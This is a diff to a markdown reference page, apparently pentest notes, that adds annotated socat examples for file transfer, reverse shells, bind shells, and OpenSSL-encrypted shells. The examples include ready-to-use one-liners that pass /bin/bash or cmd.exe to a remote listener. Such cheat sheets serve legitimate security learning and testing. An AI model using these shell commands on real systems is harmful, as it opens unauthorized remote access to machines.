@@ -158,15 +158,38 @@ address-head:
 
 ### Examples
 
+#### Basic client/server
+
+**Server:**
+
+* `STDOUT` - redirects the standard output into the session
+
+```plain
+sudo socat TCP4:<remote-server>:80 STDOUT
+```
+
+**Client:**
+
+* `-` - allows STDIO to be received and interacted with via keyboard interaction
+
+```plain
+sudo socat - TCP4:<remote-server>:80
+```
+
 #### Send a file to receiver
 
-Sender:
+**Sender:**
+
+* `fork` - creates a child process once a connection is made, this allows for multiple connections
 
 ```plain
 sudo socat TCP4-LISTEN:443,fork file:list_of_passwords.txt
 ```
 
-Receiver:
+**Receiver:**
+
+* `file` - specifies the local file name to save the file to
+* `create` - specifies a new file will be created
 
 ```plain
 $ socat TCP4:10.11.0.4:443 file:list_of_passwords.txt,create
@@ -178,28 +201,78 @@ Hellothere!
 Summer2022!
 ```
 
-#### Reverse Shell
+#### Reverse shell
 
-Listener:
+**Server:**
+
+* `-d -d` - option increases verbosity
+* `TCP4-LISTEN:443` - creates the IPv4 listener on port 443
+* `STDOUT` - connects to the standard output
 
 ```plain
-$ socat -d -d TCP4-LISTEN:443 STDOUT ... socat[4388] N listening on AF=2 0.0.0.0:443
-... socat[4388] N accepting connection from AF=2 10.0.0.11:54720 on 10.0.0.10:443
-... socat[4388] N using stdout for reading and writing
-... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
-whoami
-kali
-id
-uid=1000(kali) gid=1000(kali) groups=1000(kali)
+socat -d -d TCP4-LISTEN:443 STDOUT 
 ```
 
-Target host:
+**Client:**
+
+* `EXEC:/bin/bash` - states when the connection is established it will allow access to `/bin/bash`
 
 ```plain
 socat TCP4:10.0.0.10:443 EXEC:/bin/bash
+```
+
+#### Bind shell
+
+**Server:**
+
+In this case a Windows machine.
+
+```plain
+socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
+```
+
+**Client:**
+
+```plain
+socat - TCP4:<IP-of-SERVER>:443
+```
+
+#### Encrypted bind shell
+
+To create a certificate, please check [OpenSSL]({{< ref "openssl" >}}).
+
+**Server:**
+
+```plain
+sudo socat OPENSSL-LISTEN:443,cert=yourcert.pem,verify=0,fork EXEC:/bin/bash
+```
+
+**Client:**
+
+```plain
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+#### Encrypted reverse shell
+
+**Server:**
+
+Listening for incoming reverse shell serving the certificate created with [OpenSSL]({{< ref "openssl" >}}).
+
+```plain
+sudo socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0
+```
+
+**Client:**
+
+Windows machine starting the connection to server routing `cmd.exe` in the shell.
+
+```plain
+socat -d -d OPENSSL:192.168.189.44:443,verify=0 EXEC:'cmd.exe',pipes
 ```
 
 ### URL list
 
 * [Linux.die.net - socat](https://linux.die.net/man/1/socat)
 * [Formulae.brew.sh - socat](https://formulae.brew.sh/formula/socat)
+* [Erev0s.com - Encrypted Bind and Reverse Shells with Socat (Linux/Windows)](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
